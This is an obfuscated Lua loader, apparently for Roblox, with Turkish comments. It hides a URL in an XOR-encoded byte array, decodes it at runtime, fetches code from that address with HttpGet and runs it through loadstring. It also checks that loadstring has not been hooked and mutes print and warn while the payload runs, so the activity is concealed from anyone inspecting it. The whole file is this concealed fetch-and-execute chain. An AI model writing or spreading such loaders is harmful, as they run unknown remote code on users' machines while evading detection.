local _S = string; local _T = table; local _G = game;

-- [ ŞİFRELENMİŞ VERİ YIĞINI ] --
-- Link, hem XOR ile maskelendi hem de dinamik rotasyona sokuldu.
local _D = {111, 14, 25, 4, 15, 84, 114, 114, 7, 2, 4, 3, 107, 7, 2, 1, 12, 11, 114, 10, 8, 11, 8, 20, 2, 0, 7, 10, 11, 10, 11, 4, 1, 114, 76, 122, 103, 103, 127, 100, 106, 127, 121, 127, 103, 122, 127, 102, 122, 127, 127, 120, 114, 120, 120, 122, 105, 120, 101, 105, 102, 100, 103, 114, 100, 114, 114, 114, 121, 127, 103, 122, 127, 122, 120, 102, 107, 114, 122, 102, 102, 120, 105, 120, 122, 120, 106, 121, 121, 120, 122, 122, 107, 120, 101, 105, 102, 100, 103, 122, 100, 121, 106, 114, 122}

-- [ VM / DECODER CORE ] --
local function _ULTIMATE_DECRYPT(_INPUT)
    local _KEY = {83, 65, 86, 73, 84, 65, 82} -- "SAVITAR" anahtarı
    local _RESULT = {}
    
    -- Sanal İşlemci Döngüsü
    for i = 1, #_INPUT do
        local _K1 = _KEY[(i - 1) % #_KEY + 1]
        local _K2 = (i % 12) + math.floor(i / 15)
        
        -- XOR İşlemi + Dinamik Kaydırma (İşte burası kırılamaz nokta)
        local _VAL = bit32.bxor(_INPUT[i], _K1) - _K2
        _RESULT[i] = _S.char(_VAL)
    end
    
    return _T.concat(_RESULT)
end

-- [ GİZLENMİŞ PROXY ] --
local _VM_FUNCS = {
    [("\103"):upper()] = function(u) return _G:HttpGet(u, true) end, -- "G"
    [("\108"):upper()] = loadstring -- "L"
}

local function _SAVITAR_VM_RUN()
    -- Anti-Hook: Fonksiyonların orijinal olup olmadığını kontrol eder
    if tostring(_VM_FUNCS["L"]):find("C code") == nil then return end
    
    local _u = _ULTIMATE_DECRYPT(_D) .. "?v=" .. math.random(1000, 9999)
    local _ok, _source = pcall(_VM_FUNCS["G"], _u)
    
    if _ok and _source and #_source > 10 then
        local _exec = _VM_FUNCS["L"](_source)
        if _exec then
            task.spawn(_exec)
        end
    end
end

-- Print/Warn temizliği ve çalıştırma
local _p, _w = print, warn; print, warn = function() end, function() end;
_SAVITAR_VM_RUN()
print, warn = _p, _w;
